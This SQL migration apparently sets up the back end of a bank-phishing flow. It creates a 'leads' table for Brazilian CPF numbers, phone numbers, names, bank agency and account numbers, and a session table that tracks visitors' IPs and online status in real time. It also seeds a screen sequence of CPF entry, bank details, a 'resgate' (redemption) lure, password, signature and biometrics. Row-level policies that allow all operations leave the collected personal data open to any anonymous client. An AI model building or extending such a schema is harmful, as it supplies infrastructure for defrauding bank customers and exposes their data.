
-- Table to store leads (visitors who entered the flow)
CREATE TABLE public.leads (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  cpf TEXT,
  phone TEXT,
  nome TEXT,
  segment TEXT,
  agency TEXT,
  account TEXT,
  current_step TEXT NOT NULL DEFAULT 'splash',
  status TEXT NOT NULL DEFAULT 'em_andamento',
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Table to track site sessions/access
CREATE TABLE public.site_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  lead_id UUID REFERENCES public.leads(id) ON DELETE CASCADE,
  ip_address TEXT,
  user_agent TEXT,
  page TEXT NOT NULL,
  started_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  ended_at TIMESTAMP WITH TIME ZONE,
  is_online BOOLEAN NOT NULL DEFAULT true
);

-- Table for flow configuration (screen order & enabled/disabled)
CREATE TABLE public.flow_config (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  step_key TEXT NOT NULL UNIQUE,
  step_label TEXT NOT NULL,
  step_order INTEGER NOT NULL,
  enabled BOOLEAN NOT NULL DEFAULT true,
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS on all tables
ALTER TABLE public.leads ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.site_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.flow_config ENABLE ROW LEVEL SECURITY;

-- Public read/write policies (admin uses service role, frontend tracks via anon)
CREATE POLICY "Allow all operations on leads" ON public.leads FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Allow all operations on site_sessions" ON public.site_sessions FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Allow all operations on flow_config" ON public.flow_config FOR ALL USING (true) WITH CHECK (true);

-- Seed default flow configuration
INSERT INTO public.flow_config (step_key, step_label, step_order, enabled) VALUES
  ('splash', 'Splash', 1, true),
  ('inicio', 'Início (CPF)', 2, true),
  ('dados-bancarios', 'Dados Bancários', 3, true),
  ('resgate', 'Resgate', 4, true),
  ('senha', 'Senha', 5, false),
  ('assinatura', 'Assinatura', 6, true),
  ('biometria', 'Biometria', 7, true),
  ('concluido', 'Concluído', 8, true);

-- Trigger to update updated_at on leads
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_leads_updated_at
  BEFORE UPDATE ON public.leads
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_flow_config_updated_at
  BEFORE UPDATE ON public.flow_config
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Enable realtime for sessions (online tracking)
ALTER PUBLICATION supabase_realtime ADD TABLE public.site_sessions;
ALTER PUBLICATION supabase_realtime ADD TABLE public.leads;
